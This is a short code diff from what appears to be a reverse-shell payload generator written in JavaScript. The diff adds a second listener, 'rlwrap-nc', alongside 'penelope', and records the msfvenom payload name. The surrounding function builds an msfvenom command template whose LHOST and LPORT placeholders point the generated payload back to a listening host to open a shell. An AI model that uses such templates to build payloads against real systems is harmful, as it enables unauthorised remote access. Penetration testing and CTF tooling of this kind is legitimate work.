@@ -26,7 +26,7 @@ function def(
     id, generator: "msfvenom", title, os, contexts: ["bash-prompt"], requires: ["served-file"],
     template: `msfvenom -p ${payload} LHOST={LHOST} LPORT={LPORT} -f ${fmt} -o {FILE}`,
     parts: parts(payload, fmt, file, fmtExplain),
-    listener: "penelope", bakesIp: true, defaults: { FILE: file },
+    listeners: ["penelope", "rlwrap-nc"], msfPayload: payload, bakesIp: true, defaults: { FILE: file },
     notes: [NO_HANDLER, ...notes],
   };
 }
